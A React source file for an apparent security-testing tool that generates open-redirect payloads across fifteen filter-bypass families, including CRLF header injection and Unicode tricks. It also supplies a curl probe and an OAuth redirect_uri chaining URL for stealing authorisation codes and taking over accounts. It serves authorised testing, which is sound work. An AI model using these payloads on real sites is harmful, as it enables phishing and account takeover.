import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CopyChip,
  DownloadButton,
  KVTable,
  SectionTitle,
  TextInput,
} from '@/components/ui';
import { DEFAULT_TARGET } from '@/tools/registry';

type Family = { id: string; label: string; note: string; proves: string; build: (origin: string, dest: string) => string };

const FAMILIES: Family[] = [
  { id: 'slash', label: 'Double slash', note: '//evil.tld — the parser treats the second slash as authority', proves: 'Parser treats a relative path as absolute', build: (o, d) => `${o}/?next=//${d}` },
  { id: 'scheme', label: 'Full https: prefix', note: 'Absolute URL in a parameter meant to be relative', proves: 'No scheme validation at all', build: (o, d) => `${o}/?next=https://${d}` },
  { id: 'userinfo', label: '@ userinfo', note: 'trusted.tld@evil.tld — allow-list check on prefix', proves: 'Prefix/substring allow-list', build: (o, d) => `${o}/?next=https://trusted.example@${d}` },
  { id: 'backslash', label: 'Backslash confusion', note: 'Browsers normalise \\ to / during parsing', proves: 'Regex expects only forward slashes', build: (o, d) => `${o}/?next=https:\\\\${d}` },
  { id: 'enc2f', label: '%2f%2f encoded', note: 'Decoded once by the framework, again by the client', proves: 'Single-decode validation', build: (o, d) => `${o}/?next=%2f%2f${d}` },
  { id: 'doubleenc', label: 'Double-encoded //', note: '%252f%252f — survives one decode', proves: 'Validation before decode', build: (o, d) => `${o}/?next=%252f%252f${d}` },
  { id: 'traildot', label: 'Trailing dot', note: 'Trusted host with a trailing dot resolves identically', proves: 'Exact string comparison', build: (_o, d) => `https://trusted.example./?r=${d}` },
  { id: 'crlf', label: 'CRLF split', note: 'Control characters in the Location value', proves: 'CRLF not sanitised before the header is written', build: (o, d) => `${o}/?next=%0d%0aLocation:%20https://${d}` },
  { id: 'tab', label: 'Tab / newline before host', note: 'A leading tab is stripped by browsers during URL parsing', proves: 'Control characters not stripped', build: (o, d) => `${o}/?next=%09%2f%2f${d}` },
  { id: 'fragment', label: '# fragment split', note: 'trusted.tld#@evil.tld — the check sees the fragment', proves: 'Fragment handling mismatch', build: (_o, d) => `https://trusted.example#@${d}` },
  { id: 'suffix', label: 'Allow-list suffix', note: 'dest.attacker.tld endsWith() trusted suffix', proves: 'endswith() / contains() allow-list', build: (_o, d) => `https://${d}.trusted.example` },
  { id: 'subdomain', label: 'Trusted as subdomain', note: 'trusted.example.attacker.tld starts with the trusted value', proves: 'startsWith() allow-list', build: (_o, d) => `https://trusted.example.${d}` },
  { id: 'qs', label: 'Nested query param', note: 'A second decoder unwraps the inner value', proves: 'Double URL-parse in a redirector', build: (o, d) => `${o}/?next=//${d}/?next=//${d}` },
  { id: 'unicode', label: 'Unicode normalisation', note: 'Fullwidth slash (U+FF0F) under NFKC becomes a path separator', proves: 'NFKC normalisation after the check', build: (_o, d) => `https:\uff0f\uff0f${d}` },
  { id: 'empty', label: 'Empty-host tricks', note: 'redirect to // with whitespace padding', proves: 'Trim / whitespace handling', build: (o, d) => `${o}/?next=%20//${d}` },
];

export default function OpenRedirectGenerator() {
  const [origin, setOrigin] = useState(`https://${DEFAULT_TARGET}`);
  const [param, setParam] = useState('next');
  const [dest, setDest] = useState('oast.example.com');
  const [enabled, setEnabled] = useState<string[]>(FAMILIES.slice(0, 6).map((f) => f.id));

  const o = (origin.trim() || `https://${DEFAULT_TARGET}`).replace(/\/+$/, '');
  const d = dest.trim() || 'oast.example.com';
  const p = param.trim() || 'next';

  const payloads = useMemo(
    () => FAMILIES.filter((f) => enabled.includes(f.id)).map((f) => ({ ...f, value: f.build(o, d).replace(/\?next=/, `?${p}=`) })),
    [enabled, o, d, p],
  );

  const flat = payloads.map((x) => x.value).join('\n');

  return (
    <>
      <Card title="Redirect context">
        <div className="grid gap-4 sm:grid-cols-3">
          <TextInput label="Original endpoint" value={origin} onChange={setOrigin} mono hint="Scheme + host of the redirecting app" />
          <TextInput label="Redirect parameter" value={param} onChange={setParam} mono hint="next, redirect, return, continue, url" />
          <TextInput label="Destination" value={dest} onChange={setDest} mono hint="Placeholder host only" />
        </div>
        <div className="mt-4">
          <SectionTitle>Bypass families</SectionTitle>
          <div className="grid gap-2.5 sm:grid-cols-2 lg:grid-cols-3">
            {FAMILIES.map((f) => (
              <Checkbox
                key={f.id}
                checked={enabled.includes(f.id)}
                onChange={(on) => setEnabled((prev) => (on ? [...prev, f.id] : prev.filter((x) => x !== f.id)))}
                label={f.label}
                description={f.note}
              />
            ))}
          </div>
        </div>
      </Card>

      <Card
        title={`Payloads (${payloads.length})`}
        action={<DownloadButton text={flat} filename="open-redirect.txt" label="Download .txt" />}
      >
        {payloads.length === 0 ? (
          <Callout tone="info" title="No family selected">Tick at least one bypass family.</Callout>
        ) : (
          <div className="flex flex-col gap-4">
            {payloads.map((x) => (
              <div key={x.id}>
                <SectionTitle right={<span className="text-[11.5px] text-[var(--text-faint)]">{x.proves}</span>}>{x.label}</SectionTitle>
                <CopyChip text={x.value} />
              </div>
            ))}
          </div>
        )}
      </Card>

      <Card title="Escalation">
        <KVTable
          rows={[
            ['Probe command', `curl -sSI '${o}/?${p}=//${d}' | grep -i '^location'`],
            ['Confirmation', 'A Location header pointing at the placeholder host, or a 302 followed by the client'],
            ['OAuth chaining', `https://idp.example/authorize?client_id=APP&redirect_uri=${o}/?${p}=//${d}&response_type=code`],
          ]}
        />
        <div className="mt-4">
          <Callout tone="warn" title="When this becomes account takeover">
            An open redirect alone is low severity. It escalates when the same endpoint sits inside a validated{' '}
            <span className="rf-mono">redirect_uri</span> allow-list for an OAuth or OIDC client: the authorisation code is
            delivered to the attacker host, exchanged with the public client secret, and the resulting session is the
            victim's. The same applies to password-reset links, e-mail-verification tokens and SAML{' '}
            <span className="rf-mono">RelayState</span>. Prove it by capturing the code in your listener and confirming the
            token endpoint returns 200 — never by using a real user's session.
          </Callout>
        </div>
      </Card>
    </>
  );
}
